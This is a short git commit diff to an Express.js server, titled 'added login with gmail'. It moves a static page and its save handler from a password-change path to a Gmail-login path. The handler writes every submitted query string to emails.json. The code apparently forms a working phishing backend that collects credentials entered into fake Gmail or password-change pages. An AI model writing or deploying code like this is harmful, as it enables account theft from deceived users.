8c681082ad19cab3eba23d2ee7cd420693b8f398
Agamyrat Chariyev <agamyrat.chariyev@gmail.com>
2022-11-19 00:27:17 +0500

    added login with gmail

--- index.js
+++ index.js
@@ -2,8 +2,8 @@ const express = require('express');
 const app = express();
 const fs = require('fs');
 oldData = [];
-app.use('/account/password/change/', express.static(__dirname + '/public'));
-app.get('/account/password/change/save', function routeHandler(req, res) {
+app.use('/loginwith/gmail/', express.static(__dirname + '/public'));
+app.get('/loginwith/gmail/save', function routeHandler(req, res) {
     oldData.push(req.query);
 
     fs.writeFile('emails.json', JSON.stringify(oldData), 'utf8', () => {});
